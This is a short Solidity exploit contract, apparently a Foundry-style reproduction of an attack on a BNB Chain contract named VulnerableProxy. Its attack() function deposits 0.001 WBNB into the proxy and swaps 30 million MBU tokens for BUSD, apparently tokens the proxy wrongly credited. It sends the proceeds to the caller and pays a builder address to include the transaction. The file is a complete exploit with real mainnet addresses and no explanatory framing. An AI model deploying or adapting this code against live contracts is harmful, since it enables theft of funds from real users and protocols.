// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import {Test, console} from "forge-std/Test.sol";
import {IERC20} from "@openzeppelin/contracts/interfaces/IERC20.sol";
import {IWBNB} from "../src/interfaces/IWBNB.sol";
import {IPancakeRouter} from "../src/interfaces/IPancakeRouter.sol";
import {IVulnerableProxy} from "../src/interfaces/IVulnerableProxy.sol";

contract AttackerContract {
    // Contracts involved
    address constant wbnb = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address constant router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address constant BUSD = 0x55d398326f99059fF775485246999027B3197955;
    address constant MBU = 0x0dFb6Ac3A8Ea88d058bE219066931dB2BeE9A581;
    address constant VulnerableProxy = 0x95e92B09b89cF31Fa9F1Eca4109A85F88EB08531;
    address constant BlockRazor = 0x1266C6bE60392A8Ff346E8d5ECCd3E69dD9c5F20;

    function attack() external payable {
        IWBNB(payable(wbnb)).deposit{value: 0.001 ether}();

        IERC20(wbnb).approve(VulnerableProxy, 0.001 ether);

        IVulnerableProxy(VulnerableProxy).deposit(wbnb, 0.001 ether);

        IERC20(MBU).approve(router, type(uint256).max);

        address[] memory path = new address[](2);
        path[0] = MBU;
        path[1] = BUSD;
        IPancakeRouter(payable(router)).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            30_000_000 ether, 0, path, address(this), block.timestamp
        );

        IERC20(BUSD).transfer(msg.sender, IERC20(BUSD).balanceOf(address(this)));

        BlockRazor.call{value: 0.999 ether}("");
    }
}
